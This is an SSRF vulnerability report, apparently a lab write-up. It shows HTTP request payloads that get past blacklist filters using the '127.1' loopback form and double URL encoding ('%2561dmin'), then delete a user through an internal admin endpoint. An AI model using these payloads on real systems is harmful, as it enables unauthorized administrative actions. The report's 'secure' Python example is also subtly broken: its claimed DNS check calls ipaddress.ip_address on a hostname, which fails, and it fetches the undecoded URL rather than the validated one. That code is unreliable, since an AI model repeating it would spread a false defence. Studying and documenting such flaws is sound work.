# Vulnerability Report: Server-Side Request Forgery (SSRF) Bypassing Blacklist Input Filters via Alternative IP Representation and Double URL Encoding

* **Vulnerability Type:** Server-Side Request Forgery (SSRF) (CWE-918) / Improper Input Validation (CWE-20) / Improper Handling of Alternate Encoding (CWE-172)

* **Severity:** High

* **Target Component:** Stock Check API (`/product/stock` via `stockApi` parameter)

* **OWASP Top 10 Mapping:** A10:2021 – Server-Side Request Forgery (SSRF)

## 1. Executive Summary

A Server-Side Request Forgery (SSRF) vulnerability in the product stock check feature was found to be partially mitigated using flawed blacklist-based input filters. By leveraging alternate IPv4 representations (shortened loopback notation `127.1`) and double URL encoding (`%2561dmin`), an unauthenticated attacker can bypass both the hostname filter and path blocklists. This allows an attacker to interact with restricted loopback endpoints (`http://127.0.0.1/admin`) and execute unauthorized administrative operations, such as account deletion.

## 2. Technical Analysis & Root Cause

The target application implements a blacklist filter designed to block requests targeting local resources. Specifically, the defense attempts to detect:
1. Blocked hostnames/IP addresses (e.g., `localhost`, `127.0.0.1`).
2. Blocked path keywords (e.g., `admin`).

### Filter Flaws

1. **Host Matching Flaw:** The filter uses strict string comparison rather than resolving IP addresses or canonicalizing hostnames. Standard IPv4 parser implementations recognize `127.1` as equivalent to `127.0.0.1`, allowing the input to bypass literal string checks against `127.0.0.1` while still routing to the local network interface.

2. **Parsing Discrepancy (Double Decoding):** The front-end filter inspects the input after applying a single URL-decoding pass. By encoding the string `admin` twice (e.g., `a` $\rightarrow$ `%61` $\rightarrow$ `%2561`), the filter checks `%61dmin`, which does not trigger the string match for `admin`. When passed to the internal HTTP client, the server performs a second decoding pass, resolving `%2561dmin` to `admin` and executing the request against the restricted path.

## 3. Proof of Concept (PoC)

1. Intercept the stock check POST request in an HTTP proxy (e.g., Burp Suite):

   ```
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   stockApi=http%3A%2F%2Fstock.welsh-king.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
   ```

2. **Test Host Filter:** Attempting `stockApi=http://127.0.0.1/` or `stockApi=http://localhost/` returns an HTTP error response indicating that the target host is blocked:
   `"External stock check blocked"`

3. **Bypass Host Filter:** Substitute `127.0.0.1` with `127.1`:
   `stockApi=http://127.1/`
   
   *Result:* The host filter passes, returning `200 OK`.

4. **Test Path Filter:** Requesting `stockApi=http://127.1/admin` returns an error indicating the path is blocked. Single URL encoding (`stockApi=http://127.1/%61dmin`) also fails because the application decodes it before inspection.

5. **Bypass Path Filter:** Apply double URL encoding to the character `a` (`%2561`):
   ```
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   stockApi=http://127.1/%2561dmin
   ```

   *Result:* The filter receives `%61dmin`, allows the request, and the underlying application executes a second decoding step, rendering the administrative panel (`200 OK`).

6. **Execute Action:** Construct the full payload to delete user `carlos`:
   ```
   POST /product/stock HTTP/1.1
   Host: target-app.net
   Content-Type: application/x-www-form-urlencoded
   
   stockApi=http://127.1/%2561dmin/delete?username=carlos
   ```

7. **Result:** User `carlos` is successfully deleted.

## 4. Impact

* **Filter Evasion:** Blacklist security controls are rendered ineffective through basic encoding and syntax variations.
* **Unauthorized Access:** Access to restricted administrative interfaces on the local loopback interface.
* **Unauthorized Administrative Functionality:** Execution of privileged actions (e.g., account deletion).

## 5. Remediation & Developer Guidance

### Primary Fixes

1. **Replace Blacklists with Strict Allowlisting:**
   Avoid relying on blacklists or negative security models to block specific patterns. Implement an explicit allowlist of permitted target hosts, schemes, and path structures.

2. **Canonicalization Before Validation:**
   Fully decode, normalize, and resolve all input values (including URL decoding and IP resolution) *before* applying input validation rules.

3. **Enforce Defense in Depth (Authentication):**
   Ensure internal endpoints enforce session authentication and access checks rather than relying on network location or loopback origin filtering.

#### Secure Implementation Example (Python)

```python
import ipaddress
import urllib.parse
import requests

ALLOWED_HOSTS = ["stock.welsh-king.net"]

def fetch_stock_secure(user_input_url):
    # 1. Decode and parse URL
    unquoted_url = urllib.parse.unquote(user_input_url)
    parsed = urllib.parse.urlparse(unquoted_url)
    
    # 2. Strict allowlist validation against authorized hostnames
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Access Denied: Target host is not allowed.")
        
    # 3. Explicit DNS resolution check
    resolved_ip = ipaddress.ip_address(parsed.hostname)
    if resolved_ip.is_loopback or resolved_ip.is_private:
        raise ValueError("Access Denied: Request targets an internal address.")

    # Execute request with redirects disabled
    return requests.get(user_input_url, allow_redirects=False, timeout=3)
```

## 6. References

* **CWE-918:** [Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
* **CWE-172:** [Improper Handling of Alternate Encoding](https://cwe.mitre.org/data/definitions/172.html)
* **OWASP:** [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)